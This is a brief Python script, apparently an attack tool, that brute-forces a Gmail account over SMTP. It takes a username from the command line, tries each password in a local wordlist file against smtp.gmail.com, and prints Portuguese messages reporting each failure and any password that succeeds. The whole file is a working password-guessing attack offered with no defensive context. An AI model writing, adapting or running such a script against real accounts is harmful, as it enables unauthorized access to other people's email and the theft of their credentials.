import smtplib
import email.utils
import sys

smtpclient = smtplib.SMTP('smtp.gmail.com',587)
smtpclient.ehlo()
smtpclient.starttls()

user = sys.argv[1]
passfile = "passwords.txt"
passfile = open(passfile,'r')

for password in passfile:
 try:
  smtpclient.login(user,password)
  print ('[!] Senha encontrada %s: '%password)
  break;
 except smtplib.SMTPAuthenticationError:
  print ('[!] Senha incorreta %s: '%password) 
 